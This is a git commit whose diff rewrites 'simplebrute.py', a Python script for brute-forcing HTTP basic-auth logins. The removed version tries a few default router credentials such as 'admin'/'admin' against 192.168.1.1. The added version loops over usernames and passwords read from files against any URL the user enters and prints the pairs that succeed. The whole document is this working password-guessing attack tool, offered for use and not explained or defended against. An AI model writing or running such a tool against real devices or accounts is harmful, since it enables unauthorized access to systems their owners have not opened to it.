e9173a3fde2aeacaadf756cee1cbb55a4d244c5a
Ashkan Rafiee <35492414+AshkanRafiee@users.noreply.github.com>
2020-12-29 17:52:21 +0330

    Update simplebrute.py

--- simplebrute.py
+++ simplebrute.py
@@ -1,13 +1,36 @@
 import requests
 
-try:
-    dic = [("admin", ""), ("admin", "12345"), ("admin", "admin"), ("admin", "11111111111")]
-    for userpass in dic:
-        req = requests.get("http://192.168.1.1", auth=userpass)
-        if req.status_code == 200:
-            print ("username is : ", userpass[0])
-            print ("password is : ", userpass[1])
-        else:
-            print (userpass, " didn't match!")
-except:
-    print ("something is wrong!")
+
+def readfile(file):
+	with open(file) as f:
+	    content = f.readlines()
+	# remove whitespace characters like `\n` at the end of each line
+	content = [x.strip() for x in content]
+	return content
+
+def bruteforce(usernames, passwords, url):
+	for username in usernames:
+	    for password in passwords:
+	        try:
+	            userpass = (username, password)
+	            req = requests.get(url, auth=userpass)
+	            if req.status_code == 200:
+	                print ("username is : ", userpass[0])
+	                print ("password is : ", userpass[1])
+	                print ("Status Code: ", req.status_code)
+	            else:
+	                print (userpass, " didn't match!")
+	                print ("Status Code: ", req.status_code)
+	        except:
+	            print ("Something is wrong! - Probably Connection Issues!")
+def main():
+	url = input("Enter URL: ")
+	print("Getting user and pass from files...")
+	passwords = readfile('passwords.txt')
+	usernames = readfile('usernames.txt')
+	print("Making Request to URL...")
+	bruteforce(usernames, passwords, url)
+
+
+if __name__ == '__main__':
+	main()
